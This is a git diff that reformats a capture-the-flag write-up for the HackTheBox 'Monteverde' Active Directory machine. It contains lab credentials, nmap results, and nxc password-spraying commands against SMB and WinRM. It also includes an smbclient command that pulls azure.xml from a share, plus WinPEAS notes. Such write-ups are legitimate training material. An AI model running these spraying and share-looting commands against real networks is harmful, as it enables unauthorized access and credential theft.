@@ -5,24 +5,20 @@ categories: HTB
 tags: ["ctf", "penetration testing", "htb", "cybersecurity", "htb writeup", "monteverde", "htb walkthrough", "hackthebox", "writeup"]
 ---
 
-# Monteverde
-
----
 OS: Windows(AD)
 Difficulty: Medium
-Date: 2025-04-01
-Note: User owned in previous attempt
----
-# Summary
 
+## Credentials
 
-# Credentials
 ```text
 SABatchJobs : SABatchJobs
 mhope : 4n0therD4y@n0th3r$
 ```
-# Enumeration
-## Nmap
+
+## Enumeration
+
+### Nmap
+
 ```sh
 PORT      STATE SERVICE       REASON          VERSION
 53/tcp    open  domain        syn-ack ttl 127 (generic dns response: SERVFAIL)
@@ -54,24 +50,16 @@ PORT      STATE SERVICE       REASON          VERSION
 49749/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
 ```
 
-# Todo 
-- [ ] 5985 - HTTP
-- [x] SMB
-- [x] LDAP
-- [ ] 9389
-
-- add `megabank.local` to `/etc/hosts`
-
-## SMB
-- Enum4linux result showed a bunch of usernames
+### SMB
+>- Enum4linux result showed a bunch of usernames
 - password spraying SMB with username.txt as username and username.txt as password did not return any hits
-- 
-
+ 
 ```sh
 nxc smb megabank.local -u username.txt -p username.txt --shares
 ```
 
 ![screenshot](/assets/images/monteverde2.png)
+
 ![screenshot](/assets/images/monteverde3.png)
 
 ```sh
@@ -84,6 +72,7 @@ smbclient -U SABatchJobs //10.10.10.172/users$ SABatchJobs -c 'get mhope/azure.x
 ![screenshot](/assets/images/monteverde4.png)
 
 azure.xml
+
 ![screenshot](/assets/images/monteverde5.png)
 
 ```sh
@@ -92,18 +81,26 @@ nxc winrm megabank.local -u username.txt -p password.txt --continue-on-success
 
 ![screenshot](/assets/images/monteverde6.png)
 
-## HTTP-5985
-- raft-medium-lowercase did not return any results.
+### HTTP-5985
 
-# Foothold
+> raft-medium-lowercase did not return any results.
+
+## Foothold
+
 ![screenshot](/assets/images/monteverde8.png)
 
-# Privilege Escalation
-## WinPEAS
-- AV enabled
+## Privilege Escalation
+
+### WinPEAS
+
+>- AV enabled
+
 ![screenshot](/assets/images/monteverde9.png)
-## Manual Enumeration
+
+### Manual Enumeration
+
 mhope
+
 ![screenshot](/assets/images/monteverde10.png)
 
 ![screenshot](/assets/images/monteverde11.png)
